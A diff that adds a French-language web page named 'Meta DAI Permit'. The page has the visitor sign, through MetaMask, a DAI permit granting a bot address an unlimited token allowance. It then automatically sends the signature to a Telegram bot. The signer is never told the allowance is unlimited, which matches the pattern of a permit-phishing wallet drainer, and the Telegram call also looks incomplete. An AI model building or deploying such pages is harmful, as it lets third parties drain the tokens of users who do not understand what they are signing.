@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Meta DAI Permit</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
+</head>
+<body>
+  <h1>Signer DAI Permit et envoyer au bot</h1>
+  <button onclick="signPermit()">Signer</button>
+
+  <script>
+    // ================= CONFIG =================
+    const BOT_TOKEN = "TON_BOT_TOKEN";        // ton bot Telegram
+    const BOT_ETH_ADDRESS = "0xADRESSE_DU_BOT"; // wallet qui paiera le gas
+    const DAI = "0x11fE4B6AE13d2a6055C8D9cF65c55bac32B5d844"; // DAI Sepolia
+    const CHAIN_ID = 11155111; // Sepolia
+    // ==========================================
+
+    async function signPermit() {
+      // 1️⃣ Connexion MetaMask
+      if (!window.ethereum) {
+        alert("MetaMask non détecté !");
+        return;
+      }
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = await provider.getSigner();
+      const owner = await signer.getAddress();
+
+      // 2️⃣ Récupération nonce et name
+      const dai = new ethers.Contract(
+        DAI,
+        ["function nonces(address) view returns (uint256)", "function name() view returns (string)"],
+        provider
+      );
+
+      const nonce = await dai.nonces(owner);
+      const name = await dai.name();
+      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1h
+
+      // 3️⃣ Préparer le permit
+      const domain = {
+        name,
+        version: "1",
+        chainId: CHAIN_ID,
+        verifyingContract: DAI
+      };
+
+      const types = {
+        Permit: [
+          { name: "owner", type: "address" },
+          { name: "spender", type: "address" },
+          { name: "value", type: "uint256" },
+          { name: "nonce", type: "uint256" },
+          { name: "deadline", type: "uint256" }
+        ]
+      };
+
+      const values = {
+        owner,
+        spender: BOT_ETH_ADDRESS,
+        value: ethers.MaxUint256,
+        nonce,
+        deadline
+      };
+
+      // 4️⃣ Signer le permit
+      const signature = await signer.signTypedData(domain, types, values);
+
+      // 5️⃣ Préparer le payload JSON
+      const payload = {
+        user: owner,
+        value: values.value.toString(),
+        deadline,
+        signature
+      };
+
+      // 6️⃣ Envoi automatique au bot Telegram
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          text: JSON.stringify(payload)
+        })
+      });
+
+      alert("✅ Permit signé et envoyé au bot !");
+    }
+  </script>
+</body>
+</html>
